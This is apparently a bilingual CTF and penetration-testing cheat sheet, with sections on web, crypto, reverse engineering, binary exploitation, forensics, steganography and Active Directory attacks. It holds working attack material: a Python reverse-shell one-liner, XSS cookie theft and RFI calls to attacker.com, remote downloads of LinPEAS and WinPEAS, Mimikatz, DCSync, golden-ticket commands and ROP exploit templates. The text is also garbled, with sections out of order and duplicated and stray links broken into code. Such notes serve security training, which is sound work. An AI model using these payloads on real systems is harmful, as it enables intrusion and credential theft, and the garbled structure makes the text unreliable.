# Upload shell.php.tmp and access before it's moved
`````

### 8.7. SSRF

```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Internal services
http://127.0.0.1:8080/
http://127.0.0.1:3306/
http://127.0.0.1:6379/

# File protocol
file:///etc/passwd

# Gopher protocol (for SSRF to Redis)
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
`````

### 8.8. JWT Attacks

```bash
# Check token structure (header.payload.signature)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

# Weak secret (crack with john or hashcat)
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# None algorithm
python3 jwt_tool.py TOKEN -X a

# Algorithm confusion (RS256 -> HS256)
python3 jwt_tool.py TOKEN -X k -pk public.pem
`````

### 8.9. GraphQL

```bash
# Introspection query
{"query":"{__schema{types{name fields{name}}}}"}

# Dump schema
{"query":"{__schema{types{name fields{name type{name kind}}}}}"}

# Batching attack
[{"query":"{user(id:1){password}}"},{"query":"{user(id:2){password}}"},...]
`````

---

## 9. Cryptography

### 9.1. Classic Ciphers

```python
# Caesar cipher
def caesar_decrypt(text, shift):
    result = ""
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result += chr((ord(c) - base - shift) % 26 + base)
        else:
            result += c
    return result

# Vigenere
def vigenere_decrypt(text, key):
    result = ""
    key_idx = 0
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            shift = ord(key[key_idx % len(key)].upper()) - ord('A')
            result += chr((ord(c) - base - shift) % 26 + base)
            key_idx += 1
        else:
            result += c
    return result
`````

### 9.2. RSA Attacks

```python
# Small e (Cube root attack)
import gmpy2
def cube_root_attack(c, e=3):
    m, exact = gmpy2.iroot(c, e)
    if exact:
        return int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')
    return None

# Common modulus attack
def common_modulus(c1, [c2](../raw/r3v3rs3-sh3lls.md#command-and-control), e1, e2, n):
    # Extended Euclidean algorithm
    g, x, y = gmpy2.gcdext(e1, e2)
    if x < 0:
        c1 = gmpy2.invert(c1, n)
        x = -x
    if y < 0:
        c2 = gmpy2.invert(c2, n)
        y = -y
    m = (pow(c1, x, n) * pow(c2, y, n)) % n
    return int(m).to_bytes((int(m).bit_length() + 7) // 8, 'big')

# Wiener attack (small d)
# Use owllook or RsaCtfTool
`````

### 9.3. XOR Analysis

```python
# Single-byte XOR
def single_byte_xor(data, key):
    return bytes([b ^ key for b in data])

# Multi-byte XOR
def repeating_xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Find XOR key
def find_xor_key(data):
    best_key = None
    best_score = 0
    for key in range(256):
        decrypted = single_byte_xor(data, key)
        score = sum(1 for c in decrypted if chr(c) in 'etaoin shrdlu')
        if score > best_score:
            best_score = score
            best_key = key
    return best_key
`````

### 9.4. Hash Length Extension

```python
import struct
import hashlib

def md5_pad(message, length=None):
    # MD5 padding
    ml = len(message) * 8 if length is None else length
    message += b'\x80'
    while (len(message) * 8) % 512 != 448:
        message += b'\x00'
    message += struct.pack('<Q', ml)
    return message


---

## 10. Reverse Engineering

### 10.1. ELF Analysis (Linux)

```bash
# File info
file binary
strings binary | head -50
strings binary | grep -i password

# Symbols
nm binary
nm -C binary  # C++ demangled

# Dependencies
ldd binary
readelf -d binary

# Sections
readelf -S binary
objdump -d binary  # Disassemble

# Radare2
r2 binary
> aaa  # Analyze all
> afl  # List functions
> pdf @main  # Disassemble main
> VV   # Graph view
> iz   # Strings

# Ghidra (GUI)
# Drag and drop binary
# Analyze
# Navigate to main()
# Decompile (F5)
`````

### 10.2. [pe](../raw/w1n-1nt3rn4ls.md#pe) Analysis (Windows)

```bash
# Basic info
file binary.exe
strings binary.exe
strings binary.exe | grep -i "Microsoft\|Windows\|.dll"

# PE structure
pecheck binary.exe
pescan binary.exe

# Dependencies
ntldd binary.exe
dumpbin /dependents binary.exe

# Resource extraction
wrestool -x binary.exe -o extracted/

# Detect packers
diec binary.exe (Detect It Easy)
exeinfope binary.exe
peid binary.exe
`````

### 10.3. Decompilation

```bash
# Online decompilers
# https://dogbolt.org
# https://decompiler.com
# https://godbolt.org (compiler explorer)

# Java decompilers
jad file.class
cfr file.class
procyon file.class

# .NET decompilers
dnSpy file.exe
ILSpy file.exe
dotPeek file.exe

# Python decompilers
uncompyle6 file.pyc
decompyle3 file.pyc

# Online RE tools
# https://crackmes.one
# https://reverse.put.as
`````

### 10.4. Keygenning

```python
# Pattern recognition approach
# 1. Find where username/serial are compared
# 2. Reverse the algorithm
# 3. Write a keygen

# Example: Simple XOR keygen
def generate_serial(username):
    serial = ""
    for i, c in enumerate(username):
        serial += chr(ord(c) ^ i + 0x20)
    return serial

# Example: CRC-based keygen
def generate_key(name):
    import hashlib
    hash = hashlib.md5(name.encode()).hexdigest().upper()
    return "-".join([hash[i:i+4] for i in range(0, 16, 4)])
`````

### 10.5. Patching

```bash
# Binary patching with radare2
r2 -w binary
> s 0x1234  # Seek to address
> wa nop    # Write NOPs
> w x 9090  # Write bytes
> q

# With xxd
xxd binary | sed 's/1234: .../..../' | xxd -r > patched

# Common patches
# - Change JNZ to JZ (or vice versa)
# - NOP out check instructions
# - Change comparison value

# With Python
with open('binary', 'rb') as f:
    data = bytearray(f.read())
# Patch at offset 0x1234
data[0x1234:0x1238] = b'\x90\x90\x90\x90'
with open('patched', 'wb') as f:
    f.write(data)
`````

---

## 11. PWN / Binary Exploitation

### 11.1. [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow)

```python
# Basic structure
payload = b"A" * offset  # Fill buffer
payload += b"BBBB"        # Overwrite EBP/RBP
payload += p32(ret_addr)  # Return address

# Finding offset
# Use pattern: cyclic(2000)
# In GDB: pattern_search or find pattern
# Or: python3 -c "from pwn import *; print(cyclic(2000))"

# Exploit template
from pwn import *

# Connect
p = process('./vuln')  # Local
p = remote('target', 1337)  # Remote

# Create payload
offset = 0x42  # From pattern
payload = b"A" * offset
payload += p32(0xdeadbeef)  # EIP

# Send
p.sendline(payload)
p.interactive()
`````

### 11.2. Return-to-Libc (ret2libc)

```python
from pwn import *

offset = 0x42
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find gadgets
pop_rdi = 0x400683  # ROPgadget

# Build payload
payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p = process('./vuln')
p.sendline(payload)
p.interactive()
`````

### 11.3. ROP Chain

```python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Automatically build ROP
rop.call(elf.symbols['system'], [next(elf.search(b'/bin/sh'))])
payload = b"A" * offset + rop.chain()

# Manual ROP
pop_rdi = 0x400683
ret = 0x400682

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(elf.search(b'/bin/sh').__next__())
payload += p64(elf.symbols['system'])
`````

### 11.4. Format String

```python
# Basic leak
"%x.%x.%x.%x.%s"
"%3\$x"  # Direct parameter access

# Leak stack
for i in range(20):
    p.sendline(f"%{i}\$p".encode())
    print(p.recv())

# Write
# %n writes number of bytes printed
"\x10\x20\x30\x40%10\$n"  # Write to address at position 10
`````

### 11.5. Shellcode

```python
from pwn import *

# Generate shellcode
shellcode = asm(shellcraft.sh())
# Or: shellcraft.amd64.linux.sh()

# Custom shellcode
context.arch = 'amd64'
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f  # /bin//sh
    push rdi
    push rsp
    pop rdi
    mov al, 59
    cdq
    syscall
''')

# NOP sled
payload = b"\x90" * 100 + shellcode + p64(buffer_addr)
`````

### 11.6. PWN Tools Setup

```bash
# pwntools
pip install pwntools

# GEF (GDB Enhanced Features)
wget -q -O- https://github.com/hugsy/gef/raw/master/gef.sh | sh

# PEDA
git clone https://github.com/longld/peda.git
echo "source ~/peda/peda.py" >> ~/.gdbinit

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# ROPgadget
pip install ROPGadget
ROPgadget --binary ./vuln

# One-Gadget (find execve("/bin/sh") in libc)
gem install one_gadget
one_gadget /lib/x86_64-linux-gnu/libc.so.6
`````

---

## 12. Forensics

### 12.1. PCAP Analysis

```bash
# Basic stats
capinfos capture.pcap
tshark -r capture.pcap -q -z io,stat,1

# Filter HTTP
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "http.request" -T json

# Extract files
foremost capture.pcap
binwalk -e capture.pcap

# Follow TCP streams
tshark -r capture.pcap -z follow,tcp,ascii,0
tshark -r capture.pcap -Y "tcp.stream eq 0" -x

# DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# HTTP objects
tshark -r capture.pcap --export-objects "http,extracted_files/"
`````

### 12.2. Memory Analysis (Volatility)

```bash
# Get profile
volatility -f memory.dump imageinfo
volatility -f memory.dump kdbgscan

# Process list
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 pstree
volatility -f memory.dump --profile=Win10x64 psscan

# Network connections
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 connections
volatility -f memory.dump --profile=Win10x64 sockets

# Command line
volatility -f memory.dump --profile=Win10x64 cmdline
volatility -f memory.dump --profile=Win10x64 consoles

# Dump processes
volatility -f memory.dump --profile=Win10x64 procdump -p PID -D extracted/

# Password hashes
volatility -f memory.dump --profile=Win10x64 hashdump
volatility -f memory.dump --profile=Win10x64 lsadump

# Registry
volatility -f memory.dump --profile=Win10x64 hivelist
volatility -f memory.dump --profile=Win10x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"

# Malfind (detect injected code)
volatility -f memory.dump --profile=Win10x64 malfind

# Scan for specific things
volatility -f memory.dump --profile=Win10x64 filescan | grep -i ".txt\|.docx\|.pdf"
volatility -f memory.dump --profile=Win10x64 cmdline
volatility -f memory.dump --profile=Win10x64 windows
`````

### 12.3. Disk Images

```bash
# List partitions
mmls disk.dd
fdisk -l disk.dd

# Mount image
mount -o loop,ro disk.dd /mnt/forensic
mount -t ntfs-3g -o loop,ro,show_sys_files,streams_interface=windows disk.dd /mnt/forensic

# Autopsy (GUI)
autopsy

# Sleuth Kit
fls -r disk.dd  # List files
icat disk.dd INODE > recovered.txt  # Recover by inode
istat disk.dd INODE  # Inode info
`````

### 12.4. File Carving

```bash
# Foremost
foremost -i disk.dd -o output/

# Scalpel
scalpel disk.dd -o output/

# Bulk Extractor
bulk_extractor -o output/ disk.dd

# Photorec
photorec /log disk.dd

# Testdisk
testdisk disk.dd


---

## 13. Steganography

### 13.1. Image Steganography

```bash
# Basic checks
file image.png
strings image.png | head -20
exiftool image.png

# LSB (Least Significant Bit)
zsteg image.png   # PNG/BMP
zsteg -a image.png
stegsolve.jar     # GUI tool

# Steghide (JPEG, BMP, WAV)
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p password

# Extract with password list
for word in $(cat rockyou.txt); do
    steghide extract -sf image.jpg -p $word -q 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Password: $word"
        break
    fi
done

# Outguess
outguess -r image.jpg output.txt

# JPEGSnoop
jpegsnoop image.jpg

# binwalk (embedded files)
binwalk -e image.png

# stegsolve (GUI)
java -jar stegsolve.jar
`````

### 13.2. Audio Steganography

```bash
# Spectrograms
sox audio.wav -n spectrogram
# View output.png for hidden text/images

# Sonic Visualiser (GUI)
# View spectrogram

# SSTV (Slow Scan TV)
# QSSTV or rx-sstv

# Audacity
# Open audio file
# View -> Spectrogram
# Look for text patterns

# Deepsound
# Decode with password

# WAV steganography
steghide extract -sf audio.wav
stegolsb audio.wav
`````

### 13.3. Other Stego Techniques

```bash
# ZIP embedded in images
binwalk -e image.jpg
foremost image.jpg

# Pixel value differencing
python3 stegsolve.py

# EXIF metadata
exiftool image.jpg

# Hidden in file structure
# Check for appended data after EOF
strings image.jpg | tail

# Twitter stego
# Images from specific accounts may contain hidden messages

# PDF stego
pdftotext document.pdf - | strings
peepdf document.pdf

# Video stego
ffmpeg -i video.avi -vcodec copy -an output.avi
`````

### 13.4. Stego Tools Collection

```bash
# Install common tools
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) apt install steghide outguess zsteg binwalk exiftool ffmpeg sox

# Python tools
pip install stegano stegtool

# Online tools
# https://stylesuxx.github.io/steganography/
# https://futureboy.us/stegano/
# https://georgeom.net/StegOnline/
`````

---

## 14. Herramientas Esenciales para CTF

### 14.1. Escaneo y Reconocimiento

```bash
# Nmap
[nmap](../raw/nm4p.md) -sC -sV -p- -T4 -oA scan TARGET

# Masscan
masscan -p1-65535 --rate=1000 TARGET

# Rustscan
rustscan -a TARGET -- -A

# Gobuster
[gobuster](../raw/w3b-h4ck1ng.md#gobuster) dir -u [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://TARGET -w /usr/share/wordlists/[dirb](../raw/w3b-h4ck1ng.md#dirbusting)/common.txt
gobuster [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) -d domain.[com](../raw/w1n-s9bsyst3ms.md#com) -w subdomains.txt

# FFUF
ffuf -u http://TARGET/FUZZ -w wordlist.txt
ffuf -u http://TARGET/page?FUZZ=1 -w params.txt -fc 404

# WhatWeb
whatweb http://TARGET -v

# Wappalyzer (CLI)
wappalyzer-cli http://TARGET
`````

### 14.2. Explotacion

```bash
# Searchsploit
searchsploit apache 2.4.49
searchsploit -t linux [kernel](../raw/0s-f0nd4m3nt0s.md#kernel)

# Metasploit
[msfconsole](../raw/m3t4spl01t.md#msfconsole) -q

# SQLMap
[sqlmap](../raw/w3b-h4ck1ng.md#sqlmap) -u "http://TARGET/page?id=1" --batch

# Hydra
[hydra](../raw/p4ssw0rd-4tt4cks.md#hydra) -l admin -P passwords.txt TARGET ssh -t 4

# John / Hashcat
[john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper) --wordlist=rockyou.txt [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions).txt
[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat) -m 0 hash.txt rockyou.txt --force
`````

### 14.3. Post-Explotacion

```bash
# LinPEAS
wget http://ATTACKER/[linpeas](../raw/l1n9x-pr1v3sc.md#linpeas).sh; [chmod](../raw/0s-f0nd4m3nt0s.md#permisos) +x [linpeas](../raw/l1n9x-pr1v3sc.md#linpeas).sh; ./[linpeas](../raw/l1n9x-pr1v3sc.md#linpeas).sh

# WinPEAS
certutil -urlcache -f http://ATTACKER/[winpeas](../raw/l1n9x-pr1v3sc.md#winpeas).exe [winpeas](../raw/l1n9x-pr1v3sc.md#winpeas).exe

# Mimikatz (Windows)
[mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz).exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# BloodHound
[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)-[python](../raw/pyth0n-f0r-h4ck1ng.md) -u user -p pass -d domain.com -dc dc.domain.com -c All
`````

### 14.4. Password Cracking

```bash
# Hashcat common modes
# 0 = MD5
# 1000 = NTLM
# 13100 = Kerberos TGS
# 18200 = AS-REP hash
# 2500 = WPA/WPA2
# 16800 = WPA PMKID
# 3200 = bcrypt
# 1800 = sha512crypt

hashcat -m 0 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# John
john --wordlist=rockyou.txt hash.txt
john --show hash.txt
`````

### 14.5. Useful Python One-Liners

```python
# HTTP server
python3 -m http.server 80

# Reverse shell
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("[ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip)",PORT));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Simple port scanner
python3 -c 'import socket; print({p: socket.socket().connect_ex(("TARGET",p))==0 for p in [21,22,80,443,445,3306,8080]})'
`````

---

## 15. Osueta Mental (Mindset)

### 15.1. No Frustrarse

El CTF es frustrante. Te vas a estancar. Todos se estancan. La diferencia entre los que resuelven y los que no:

1. **No te rindas rapido**: Dedicarle al menos 2-3 horas antes de pedir hint
2. **Toma descansos**: 15 minutos cada hora. La solucion te llega en el du char
3. **Cambia de enfoque**: Si estas atascado en web, proba con SMB
4. **Vuelve a lo basico**: Revisa los puertos de nuevo. Te saltaste alguno?

### 15.2. Saber Cuando Buscar Ayuda

- Despues de 3 horas sin progreso
- Si probaste todas las ideas que tenias
- Si no sabes que mas buscar
- Busca en Google!, writeups de maquinas similares

### 15.3. Writeups

Leer writeups NO es trampa. Es como estudias:
1. Lee el writeup hasta que te destrabe
2. Vuelve a intentar el resto solo
3. Toma notas de lo que aprendiste
4. No copies ciegamente - entendelo

### 15.4. Notas

Toma notas SIEMPRE:
- Comandos que funcionaron
- Puertos y servicios
- Usuarios y credenciales
- Pasos que seguiste
- Lo que probaste y no funciono
- Lo que aprendiste

```bash
# Template de notas
mkdir -p ~/[ctf](../raw/ctf-h4ckth3b0x.md)/$MACHINE/{nmap,enum,[exploit](../raw/m3t4spl01t.md#exploits),post,loot}
cd ~/ctf/$MACHINE

# Create notes
cat > notes.md << 'EOF'
# Machine: Name
## Info
- Date:
- Difficulty:
- OS:
- [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip):

## [recon](../raw/0s1nt.md#reconocimiento)
- Ports open:
- Services:
- Interesting paths:

## Foothold
- Vulnerability:
- [exploit](../raw/m3t4spl01t.md#exploits) used:
- Commands:

## [privilege escalation](../raw/l1n9x-pr1v3sc.md)
- Vector:
- Steps:

## Flags
- user.txt:
- root.txt:

## Lessons Learned
-
EOF
`````

### 15.5. Metodologia Personal

```markdown
## Mi Metodologia [ctf](../raw/ctf-h4ckth3b0x.md)

### Siempre
1. [nmap](../raw/nm4p.md) full ports + service version + scripts
2. [gobuster](../raw/w3b-h4ck1ng.md#gobuster)/ffuf en todos los puertos web
3. Revisar [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb), FTP, SNMP, etc
4. Buscar versiones en searchsploit
5. Revisar codigo fuente de paginas

### Si es Linux
1. [recon](../raw/0s1nt.md#reconocimiento) ([kernel](../raw/0s-f0nd4m3nt0s.md#kernel), [suid](../raw/l1n9x-pr1v3sc.md#suid), [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs), [sudo](../raw/l1n9x-pr1v3sc.md#sudo) -l)
2. [linpeas](../raw/l1n9x-pr1v3sc.md#linpeas)
3. Buscar archivos con credenciales

### Si es Windows
1. Recon (systeminfo, whoami /priv, servicios)
2. [winpeas](../raw/l1n9x-pr1v3sc.md#winpeas)
3. [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz) (si hay privilegios)

### Cuando estoy atascado
1. Vuelve a escanear (te saltaste algun [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos)?)
2. Busca writeups de maquinas similares
3. Pregunta en Discord/foros
4. Vuelve a enumerar el servicio principal
5. Busca en Google: service version [exploit](../raw/m3t4spl01t.md#exploits)
`````

### 15.6. Herramientas Mentales

- **Divide y venceras**: Parti el problema en partes chicas
- **Hipotesis**: Formulate hipotesis y probalas
- **Sigue las pistas**: Cada flag te lleva a la siguiente
- **Automatica**: Si vas a hacer algo mas de 2 veces, automatizalo
- **Documenta**: Lo que no esta escrito no existe
- **Repite**: La practica hace al maestro. Cada maquina que resuelves te prepara para la siguiente

---

## 16. Ejercicios Practicos

### Ejercicio 1: HTB Starting Point
Resuelve todas las maquinas de HTB Starting Point Tier 0 y Tier 1 (gratis sin VIP). Documenta cada una con notas.

### Ejercicio 2: THM Path
Completa el learning path "Jr Penetration Tester" de TryHackMe. Son 25+ rooms que cubren los fundamentos.

### Ejercicio 3: Maquina Linux Easy
Resuelve una maquina Linux Easy (HTB o THM). Documenta paso a paso: recon, foothold, PE, flags.

### Ejercicio 4: Maquina Windows Easy
Resuelve una maquina Windows Easy. Enfocate en la escalada de privilegios y el uso de herramientas Windows.

### Ejercicio 5: AD Lab
Configura un lab de AD local y practica ataques: Kerberoasting, AS-REP, Pass-the-Hash DCSync.

### Ejercicio 6: Web Challenge
Resuelve 5 web challenges de HTB o THM que incluyan: SQLi, XSS, LFI, SSTI, y SSRF.

### Ejercicio 7: Crypto CTF
Resuelve 3 crypto challenges: uno de RSA, uno de XOR, y uno de cifrado clasico.

### Ejercicio 8: Crackme
Descarga un crackme de crackmes.one y resuelvelo. Analiza el binario, extrae el algoritmo, y genera un keygen.

### Ejercicio 9: PWN Basic
Resuelve un buffer overflow basico de pwnable.kr o pwn.college. Practica con pwntools.

### Ejercicio 10: Forensics
Analiza un pcap de malware (malware-traffic-analysis.net) y responde: IPs maliciosas, payloads, IoCs.

### Ejercicio 11: Stego
Resuelve 3 desafios de esteganografia: LSB en imagen, espectrograma en audio, metadata oculta.

### Ejercicio 12: Writeup
Escribe un writeup completo de una maquina que resolviste. Incluye: recon, explotacion, PE, flags, y lecciones aprendidas.

---

## 17. Recursos

### Plataformas
- Hack The Box: https://hackthebox.com
- TryHackMe: https://tryhackme.com
- PicoCTF: https://picoctf.com
- Root-Me: https://root-me.org
- Pwnable.kr: https://pwnable.kr
- Pwnable.tw: https://pwnable.tw
- Crackmes.one: https://crackmes.one
- Reversing.kr: https://reversing.kr
- Pwn.college: https://pwn.college
- CTFtime: https://ctftime.org

### Youtube Channels
- IppSec (HTB writeups)
- John Hammond (CTF writeups)
- The Cyber Mentor (pentesting)
- 0xdf (HTB writeups)
- Rana Khalil (web)
- HackTheBox (oficial)
- NetworkChuck

### Libros
- The Hacker Playbook 3 (Peter Kim)
- Penetration Testing: A Hands-On Introduction
- Web Application Hacker's Handbook
- Practical Binary Analysis
- Hacking: The Art of Exploitation

### Wordlists
- /usr/share/wordlists/rockyou.txt
- /usr/share/wordlists/seclists/
- /usr/share/wordlists/dirb/
- /usr/share/wordlists/dirbuster/
- https://github.com/danielmiessler/SecLists


---

## 7. Active Directory Attacks

### 7.1. AD Enumeration

```bash
# Linux tools
# ldapsearch
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\\user" -w "password" -b "DC=domain,DC=[com](../raw/w1n-s9bsyst3ms.md#com)"

# BloodHound (Python)
[bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound)-[python](../raw/pyth0n-f0r-h4ck1ng.md) -u user -p "password" -d domain.com -dc dc.domain.com -c All -ns DC_IP

# CrackMapExec
crackmapexec smb DC_IP -u user -p "password" --users
crackmapexec smb DC_IP -u user -p "password" --groups
crackmapexec smb DC_IP -u user -p "password" --pass-pol
crackmapexec smb DC_IP -u user -p "password" --sessions

# Impacket
impacket-GetADUsers domain.com/user:password -all
impacket-GetNPUsers domain.com/ -usersfile users.txt -format [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat)
impacket-GetUserSPNs domain.com/user:password -request
`````

### 7.2. Kerberoasting

```bash
# Request TGS for SPNs
impacket-GetUserSPNs domain.com/user:"password" -request -output hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt --force
`````

### 7.3. AS-REP Roasting

```bash
# Find users without Kerberos pre-authentication
impacket-GetNPUsers domain.com/ -usersfile users.txt -format hashcat -output hashes.txt

# Crack
hashcat -m 18200 hashes.txt rockyou.txt
`````

### 7.4. Pass-the-Hash

```bash
# With Impacket
impacket-psexec domain.com/user@target -hashes LMHASH:NTHASH
impacket-wmiexec domain.com/user@target -hashes LMHASH:NTHASH
impacket-smbexec domain.com/user@target -hashes LMHASH:NTHASH

# With CrackMapExec
crackmapexec smb target -u user -H NTHASH -x whoami

# With evil-winrm
evil-winrm -i target -u user -H NTHASH
`````

### 7.5. DCSync Attack

```bash
# Requires DA privileges
impacket-secretsdump -just-dc domain.com/admin:"password"@DC_IP
impacket-secretsdump -just-dc-ntlm domain.com/admin:"password"@DC_IP

# Using hash
impacket-secretsdump -just-dc domain.com/admin@DC_IP -hashes LMHASH:NTHASH
`````

### 7.6. Golden Ticket

```bash
# Requirements: KRBTGT hash + Domain SID
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain domain.com -user Administrator

# Use the ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/Administrator@target -k -no-pass
`````

### 7.7. Silver Ticket

```bash
# Requirements: Service NTHASH + Service SID
impacket-ticketer -nthash SERVICE_HASH -domain-sid DOMAIN_SID -domain domain.com -user Administrator -spn service/computer.domain.com

# Use the ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/Administrator@target -k -no-pass
`````

### 7.8. Responder + NTLM Relay

```bash
# Start Responder
[responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) -I eth0 -dw

# Start NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c whoami

# Force authentication (various methods)
# 1. SMB: crackmapexec smb target -u "" -p "" --shares
# 2. LLMNR/NBT-NS poisoning (Responder)
# 3. Printer bug (MS-RPRN abuse)
`````

### 7.9. ACL Abuse

```bash
# Check ACLs with BloodHound
# Look for:
# - GenericAll on user (reset password)
# - GenericAll on group (add user to group)
# - WriteOwner on object
# - WriteDACL on object
# - ForceChangePassword
# - AddMember to group

# Force password reset
net user target_user NewPass123! /domain

# Add to group
net group "Domain Admins" our_user /add /domain
`````

### 7.10. AD Attack Flow

```markdown
## [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) Attack Chain

1. Enumerate AD ([bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound), ldapsearch)
2. Initial foothold (web [exploit](../raw/m3t4spl01t.md#exploits), [phishing](../raw/ph1sh1ng.md), etc.)
3. Enumerate from inside (Powerview, BloodHound collector)
4. [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting) / [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting)
5. Crack hashes offline ([hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat))
6. pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) / Overpass-the-[hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)
7. Lateral movement ([wmi](../raw/w1n-s9bsyst3ms.md#wmi), PSExec, WinRM)
8. [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync) (if DA privileges obtained)
9. [golden ticket](../raw/w1nd0ws-d0m41n-4dm1n.md#golden-ticket) persistence
`````

---

## 8. Web Challenges

### 8.1. SQL Injection

```bash
# Manual testing
' OR 1=1 --
' OR '1'='1
admin' --
1' ORDER BY 1--
1' UNION SELECT null,null--

# Blind testing
1' AND 1=1--
1' AND 1=2--
1' AND SLEEP(5)--

# Automated
[sqlmap](../raw/w3b-h4ck1ng.md#sqlmap) -u "[http](../raw/r3d3s-f0nd4m3nt0s.md#http)://target/page?id=1" --batch --level=3
sqlmap -r request.txt --batch --os-shell
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch
`````

### 8.2. XSS

```javascript
// Reflected
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// Stored (comments, profiles, etc.)
<script>document.location='http://attacker.[com](../raw/w1n-s9bsyst3ms.md#com)/steal.php?c='+document.cookie</script>

// DOM-based
#<script>alert(1)</script>
javascript:alert(1)

// Blind [xss](../raw/w3b-h4ck1ng.md#xss)
<script src="http://attacker.com/hook.js"></script>
`````

### 8.3. LFI/RFI

```bash
# Local File Inclusion
http://target/page?file=../../../etc/passwd
http://target/page?file=....//....//....//etc/passwd
http://target/page?file=php://filter/convert.base64-encode/resource=index.php

# Remote File Inclusion
http://target/page?file=http://attacker.com/shell.txt
http://target/page?file=\\attacker\share\shell.txt

# Log poisoning
# Access: http://target/page?file=<?php system($_GET['c']);?>
# Then include /var/log/apache2/access.log with ?c=id

# /proc/self/environ
# Poison User-Agent header, then include /proc/self/environ
`````

### 8.4. SSTI

```python
# Jinja2
{{7*7}}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# Twig
{{7*7}}
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

# FreeMarker
${7*7}
<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}
`````

### 8.5. Command Injection

```bash
# Basic
; id
| id
$(id)
`id```

# Blind
; sleep 5
| ping -c 5 127.0.0.1
`````

### 8.6. File Upload

```bash
# Extension bypass
shell.php
shell.php5
shell.phtml
shell.php7
shell.php.jpg
shell.jpg.php
shell.php%00.jpg
shell.php;.jpg

# Content-Type bypass
image/gif
image/png
image/jpeg

# Magic bytes bypass
GIF89a (for GIF)
\x89PNG (for PNG)
\xff\xd8\xff (for JPEG)

# Race condition
# Upload shell.php.tmp and access before it's moved
`````

### 8.7. SSRF

```bash
# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Internal services
http://127.0.0.1:8080/
http://127.0.0.1:3306/
http://127.0.0.1:6379/

# File protocol
file:///etc/passwd

# Gopher protocol (for SSRF to Redis)
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a
`````

### 8.8. JWT Attacks

```bash
# Check token structure (header.payload.signature)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

# Weak secret (crack with john or hashcat)
python3 jwt_tool.py TOKEN -C -d rockyou.txt

# None algorithm
python3 jwt_tool.py TOKEN -X a

# Algorithm confusion (RS256 -> HS256)
